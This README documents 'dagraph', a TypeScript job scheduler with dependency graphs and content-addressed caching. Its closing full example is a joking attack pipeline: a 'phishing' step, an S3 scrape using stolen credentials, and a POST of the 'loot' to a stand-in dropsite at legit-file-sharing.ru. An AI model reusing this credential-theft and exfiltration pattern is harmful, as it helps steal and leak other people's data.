# dagraph

Directed Acyclic Action Graph — _da graph._

Jobs depend on other jobs. You wire them into a graph, and the engine runs everything — parallel, cached, no wasted effort. If a job already produced the right output, it gets skipped. The engine checks the files, verifies they haven't changed, and moves on.

## What it does

dagraph is a scheduler for file-producing work. Every job takes file paths in and writes file paths out. The engine doesn't care what's in them — images, transcripts, whatever. If the work produces files, it fits.

You describe your work as a directed acyclic graph. Edges encode "this job needs that job's output." The engine figures out what can run in parallel, what needs to wait, and what can be skipped entirely because the answer is already on disk.

## How it schedules

The scheduler is a readiness-loop state machine. It starts by identifying all jobs with no dependencies — these are immediately eligible to run. As each job finishes, the scheduler checks whether any of its dependents now have all their inputs satisfied. Newly-ready jobs get priority: they jump to the front of the queue rather than waiting behind unrelated work from other branches of the graph. This keeps the working set tight. A fetch finishes, and its dependent transform starts immediately instead of sitting behind queued fetches from other subgraphs.

The engine dispatches up to a configurable number of concurrent jobs. When all slots are full, it waits for something to finish before starting anything new. When a job fails, everything downstream is marked as a dependency failure and skipped — no wasted compute on doomed work.

## How it caches

Caching is content-addressed. Each job's cache key is a hash of its name, its configuration, and the content hashes of everything it depends on. This forms a Merkle tree: changes ripple downstream automatically. If you change a job's input, its cache key changes, and so do the keys of everything that depends on it.

Configuration is part of the cache key. If you change an ffmpeg filter, a prompt template, or any parameter that affects output quality, you need to reflect that in the configuration string. Otherwise the engine will keep serving stale cached results. This is deliberate — it makes policy changes explicit rather than silent.

Three cache backends ship with the library: in-memory (gone when the process exits), filesystem-backed (survives between runs), and tiered (checks a local cache first, falls back to a remote one, and promotes remote hits to local on read). You can implement your own — the interface is just get and put.

## How actions are defined

An action is a reusable template for a kind of work. You define it once with a naming rule, a configuration version, and an implementation function. The implementation receives whatever external dependencies it needs (HTTP clients, CLI tools, database connections) through a context object bound at definition time. The serializable parameters — IDs, paths, prompts, dependency references — stay separate. This split matters for remote execution: parameters can be shipped to a worker that has its own context.

Dependencies between actions are type-safe. When you declare that a resize action depends on a fetch action's output, the type system enforces that the resize action receives the right kind of input. Miswired dependencies are caught at compile time, not at runtime.

## How it validates

The graph validates eagerly. Adding a job with a duplicate name throws immediately. Referencing a dependency that doesn't exist throws immediately. Cycle detection runs during analysis using depth-first traversal — if the graph has a cycle, you find out before any work starts.

## How execution is dispatched

Execution goes through a pluggable runner. The default runner calls the action function directly in the current process. Swap in your own to dispatch work to remote workers, container orchestrators, or anything else. The runner receives the node, its resolved inputs, and an output directory; how it executes is its business.

Every state transition during execution — job started, succeeded, failed, hit cache, skipped due to dependency failure — is reported to an observer callback. This is how you build progress bars, logging, or monitoring without coupling any of that into the engine itself.

## What it produces

Each job produces one of three outcomes: it ran and succeeded (with outputs and a content hash), it was served from cache (same shape, different status), or it failed (with an error, either its own or inherited from an upstream failure). These results are available per-job after execution completes.

## Modules

| File               | Purpose                                                                                     |
| ------------------ | ------------------------------------------------------------------------------------------- |
| `types.ts`         | Core interfaces: `Node`, `Cache`, `CacheEntry`, `NodeRef<T>`, `ExecResult`, `Outputs`       |
| `graph.ts`         | `Graph` class: node registration, analysis, kind topology                                   |
| `execute.ts`       | `execute` function: standalone execution with `ExecutionContext` (cache, fs, CAS directory) |
| `exec-state.ts`    | Scheduler state machine: ready queue, inflight tracking, dependency fan-out                 |
| `define-action.ts` | `defineAction` factory: binds context, params, and config into a reusable action definition |
| `cache.ts`         | `MemCache`, `FsCache` (filesystem-backed), `TieredCache` (local + remote with promotion)    |
| `helpers.ts`       | SHA256 hashing, output verification, cycle detection                                        |

## Nodes

Every job in da graph is a node:

```typescript
interface Node {
  name: string;
  kind: string;
  deps: string[];
  config: string;
  params: BaseParams;
  action: (rawInputs: Record<string, Outputs>, outputDir: string) => Promise<Outputs>;
}
```

`params` holds everything serializable — IDs, paths, prompts, dep refs. External dependencies (filesystem, HTTP clients, CLI tools) get bound at definition time via a context object and stay outside `params`. This means `params` can be shipped to a remote worker — the worker just needs the action registry and its own context.

`kind` groups nodes by type (`"fetch"`, `"transform"`) for aggregate counts and progress displays. Not part of the cache key.

`config` is a version tag plus any parameters that should invalidate cache when changed (e.g., `"v1"` or `"v2,model=gpt4"`). Included in the action key hash.

## Defining Actions

`defineAction` separates naming, cache config, and execution into one spec:

```typescript
const resize = defineAction<Ctx, ResizeParams, string>({
  name: (p) => `resize:${p.imageId}`,
  config: "v1",
  action: (ctx) => async (params, inputs, outputDir) => {
    const outPath = `${outputDir}/resized.jpg`;
    await ctx.imageLib.resize(inputs.source, outPath);
    return outPath;
  },
});
```

First type parameter (`Ctx`) is the context type — whatever external dependencies your actions need. The `config` field can be a string or an object (objects get JSON-stringified). Change the config, the cache is dead for that action.

## Full Example

```typescript
import { defineAction, execute, Graph, MemCache, type NodeRef } from "@podpiper/dagraph";

interface PhishParams {
  kind: "phish";
  target: string;
}

const sendPhishingEmail = defineAction<{}, PhishParams, string>({
  name: (p) => `phish:${p.target}`,
  config: "v1",
  action: () => async (params, _inputs, outputDir) => {
    const outPath = `${outputDir}/credentials.json`;
    const response = await (await globalThis.fetch(params.target)).text();
    await Bun.write(outPath, response);
    return outPath;
  },
});

interface ScrapeParams {
  kind: "scrape";
  bucket: string;
  deps: { credentials: NodeRef<string> };
}

const scrapeTheirDrive = defineAction<{}, ScrapeParams, string>({
  name: (p) => `scrape:${p.bucket}`,
  config: "v1",
  action: () => async (params, inputs, outputDir) => {
    const outPath = `${outputDir}/stolen-docs.json`;
    const creds = JSON.parse(await Bun.file(inputs.credentials).text());
    // use their own API keys against them
    const docs = await (
      await globalThis.fetch(`https://${params.bucket}.s3.amazonaws.com`, {
        headers: { Authorization: creds.token },
      })
    ).text();
    await Bun.write(outPath, docs);
    return outPath;
  },
});

interface ExfilParams {
  kind: "exfil";
  dropsite: string;
  deps: { docs: NodeRef<string> };
}

const exfiltrate = defineAction<{}, ExfilParams, string>({
  name: (p) => `exfil:${p.dropsite}`,
  config: "v1",
  action: () => async (params, inputs, outputDir) => {
    const outPath = `${outputDir}/receipt.json`;
    const loot = await Bun.file(inputs.docs).text();
    await globalThis.fetch(params.dropsite, { method: "POST", body: loot });
    await Bun.write(outPath, JSON.stringify({ status: "gone", bytes: loot.length }));
    return outPath;
  },
});

// Build da graph
const graph = new Graph();

const credsRef = sendPhishingEmail.addNode(
  graph,
  {},
  {
    kind: "phish",
    target: "https://definitely-real-hr-portal.biz/reset-password",
  },
);
const docsRef = scrapeTheirDrive.addNode(
  graph,
  {},
  {
    kind: "scrape",
    bucket: "acme-corp-totally-not-public",
    deps: { credentials: credsRef },
  },
);
exfiltrate.addNode(
  graph,
  {},
  {
    kind: "exfil",
    dropsite: "https://legit-file-sharing.ru/upload",
    deps: { docs: docsRef },
  },
);

// Send 'em in
const results = await execute(graph, {
  cache: new MemCache(),
  fs: dagFs,
  casBaseDir: "/tmp/safehouse",
});
```
